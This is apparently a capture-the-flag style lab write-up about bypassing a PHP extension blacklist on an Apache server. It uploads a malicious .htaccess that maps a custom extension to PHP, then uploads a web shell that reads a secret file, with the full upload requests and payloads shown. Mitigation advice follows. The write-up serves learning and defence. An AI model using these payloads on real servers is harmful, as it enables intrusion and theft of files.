# Web Shell Upload via Extension Blacklist Bypass

## 📌 Lab Overview

This lab demonstrates a **File Upload Vulnerability** caused by an insecure **extension blacklist**.

The application attempted to prevent users from uploading executable PHP files by blocking specific extensions such as:

```text
.php
```

However, the protection relied entirely on a blacklist and failed to account for server-side configuration files.

Since the application was running on an **Apache web server**, it was possible to upload a malicious `.htaccess` file and instruct Apache to treat a different extension as PHP code.

This allowed a malicious web shell to bypass the blacklist and achieve Remote Code Execution (RCE).

This lab focused on:

- File Upload Vulnerabilities
- Extension Blacklist Bypass
- Apache Configuration Abuse
- .htaccess Files
- Web Shell Uploads
- Remote Code Execution

---

# 🔍 What is a Blacklist?

A blacklist is a security mechanism that blocks specific inputs that are considered dangerous.

Example:

```text
Blocked Extensions:

.php
.exe
.jsp
.asp
```

If a user uploads:

```text
virus.php
```

the upload is rejected because `.php` appears on the blacklist.

---

## ⚠ Why Are Blacklists Weak?

Blacklists only block known bad values.

Attackers can often bypass them using:

```text
.php5
.phtml
.phar
.custom extensions
.htaccess tricks
```

A safer approach is:

```text
Allowlist Validation
```

Example:

```text
Only Allow:

.jpg
.png
.gif
```

Everything else is rejected.

---

# 🎯 Objective

The goal of this lab was to:

- bypass the PHP extension blacklist
- upload a malicious web shell
- execute PHP code on the server
- retrieve Carlos's secret
- solve the lab

---

# 🖼 Step-by-Step Walkthrough

## Screenshot 1 — Normal Webpage

![Screenshot 1](screenshot-upload1.png)

The application initially displayed:

- a normal webpage
- a **My Account** button

---

## Screenshot 2 — Login Page

![Screenshot 2](screenshot-upload2.png)

After clicking **My Account**, I landed on the login page.

The lab provided credentials:

```text
Username: wiener
Password: peter
```

I entered the credentials and logged in.

---

## Screenshot 3 — Avatar Upload Functionality

![Screenshot 3](screenshot-upload3.png)

After logging in as:

```text
wiener
```

I could see:

- Update Email functionality
- Avatar Upload functionality

To test the upload feature, I selected:

```text
luffy.jpg
```

and uploaded it.

---

## Screenshot 4 — Successful Image Upload

![Screenshot 4](screenshot-upload4.png)

The application responded:

```text
The file avatars/luffy.jpg has been uploaded.
```

confirming that uploads were functioning correctly.

---

## Screenshot 5 — Attempting PHP Upload

![Screenshot 5](screenshot-upload5.png)

After returning to **My Account**, I confirmed the image was displayed correctly.

I then selected:

```php
virus.php
```

containing:

```php
<?php echo file_get_contents('/home/carlos/secret') ?>
```

and attempted to upload it.

---

## Screenshot 6 — Upload Rejected

![Screenshot 6](screenshot-upload6.png)

The application responded:

```text
Sorry, php files are not allowed.
Sorry, there was an error uploading your file.
```

This confirmed that:

```text
.php
```

files were blocked by the upload validation mechanism.

---

## Screenshot 7 — Identifying Apache

![Screenshot 7](screenshot-upload7.png)

I captured the upload request:

```http
POST /my-account/avatar
```

and inspected the response headers.

One header revealed:

```http
Server: Apache/2.4.41 (Ubuntu)
```

This was an important clue.

### Why Was Apache Important?

Apache supports special configuration files called:

```text
.htaccess
```

A `.htaccess` file allows administrators to define custom behavior for files inside a directory.

Examples include:

```text
Access control
URL rewriting
Authentication
File type handling
```

If an attacker can upload a `.htaccess` file, Apache will obey its instructions.

This led to the attack idea:

```text
Cannot Upload PHP?
↓
Change Apache Rules
↓
Make Another Extension Execute As PHP
```

Instead of bypassing the blacklist directly, I decided to modify Apache's behavior.

---

## Screenshot 8 — Uploading a Malicious .htaccess File

![Screenshot 8](screenshot-upload8.png)

I modified the upload request:

```http
Content-Disposition: form-data;
name="avatar";
filename=".htaccess"

Content-Type: application/x-php

AddType application/x-httpd-php .qwert
```

### Payload Breakdown

Uploaded file:

```text
.htaccess
```

Apache configuration:

```apache
AddType application/x-httpd-php .qwert
```

Meaning:

```text
Treat every .qwert file as PHP
```

Before:

```text
virus.qwert → Downloaded as file
```

After:

```text
virus.qwert → Executed as PHP
```

This effectively created a brand-new PHP extension.

The upload succeeded:

```text
The file avatars/.htaccess has been uploaded.
```

---

## Screenshot 9 — Uploading the Web Shell

![Screenshot 9](screenshot-upload9.png)

Next, I uploaded:

```http
Content-Disposition: form-data;
name="avatar";
filename="virus.qwert"

Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret') ?>
```

### Payload Breakdown

Filename:

```text
virus.qwert
```

Because of the uploaded `.htaccess` file:

```text
.qwert
```

was now treated as PHP.

PHP Payload:

```php
<?php echo file_get_contents('/home/carlos/secret') ?>
```

Purpose:

```text
Read Carlos's secret file
Display its contents
```

The upload succeeded:

```text
The file avatars/virus.qwert has been uploaded.
```

---

## Screenshot 10 — Using "Show Response in Browser"

![Screenshot 10](screenshot-upload10.png)

I used Burp Suite's feature:

```text
Show Response in Browser
```

to obtain the URL of the uploaded file.

This allowed me to access the uploaded resource directly through the browser.

---

## Screenshot 11 — Accessing the Uploaded File

![Screenshot 11](screenshot-upload11.png)

After opening the copied URL, I saw the upload confirmation page:

```text
The file avatars/virus.qwert has been uploaded.
```

I then returned to the account page.

---

## Screenshot 12 — Executing the Web Shell

![Screenshot 12](screenshot-upload12.png)

Back on the account page, the avatar appeared as a broken image.

I right-clicked the image and selected:

```text
Open Image in New Tab
```

When Apache served:

```text
virus.qwert
```

it interpreted it as PHP because of the previously uploaded `.htaccess` file.

The PHP code executed and revealed Carlos's secret:

```text
1po5SAMwVQLbF3uHvA8PtPeklMGuWLqR
```

I copied the secret and submitted it through the lab banner.

The lab was successfully solved.

---

# ⚠ Why This Vulnerability Exists

The vulnerability existed because:

- the application relied on a blacklist
- `.htaccess` files were allowed to be uploaded
- Apache trusted uploaded configuration files
- uploaded directories executed user-controlled files
- dangerous file extensions could be redefined

The security model effectively became:

```text
User Controls Upload
↓
User Controls Apache Rules
↓
User Controls Code Execution
```

---

# 💥 Impact

An attacker could potentially:

- upload web shells
- achieve Remote Code Execution
- read sensitive files
- steal credentials
- execute system commands
- gain complete server compromise

---

# 🛡 Mitigation

To prevent this issue:

- use allowlists instead of blacklists
- block `.htaccess` uploads
- store uploads outside the web root
- disable script execution in upload directories
- validate file contents rather than extensions
- remove dangerous Apache directives from user-controlled locations

Example:

```text
Allow:

.jpg
.png
.gif
```

Reject everything else.

---

# 🧠 Skills Learned

- File Upload Testing
- Extension Blacklist Bypass
- Apache Web Server Behavior
- .htaccess Abuse
- Remote Code Execution
- Web Shell Upload Techniques
- Burp Suite Request Manipulation

---

# 🧰 Tools Used

- Burp Suite
- Burp Repeater
- Browser Developer Tools
- Apache Configuration Knowledge
- PortSwigger Web Security Academy

---

# ✅ Conclusion

This lab demonstrated how relying solely on extension blacklists can lead to complete server compromise.

By identifying that the application was running on Apache, uploading a malicious `.htaccess` file, and redefining a custom extension as executable PHP, I successfully bypassed the blacklist protection.

The uploaded web shell executed server-side code and revealed Carlos's secret.

Through this lab, I learned:

- why blacklists are weak security controls
- how Apache processes `.htaccess` files
- how custom extensions can become executable
- how web shell uploads lead to Remote Code Execution

The lab was successfully solved by abusing Apache configuration and bypassing the file extension blacklist.
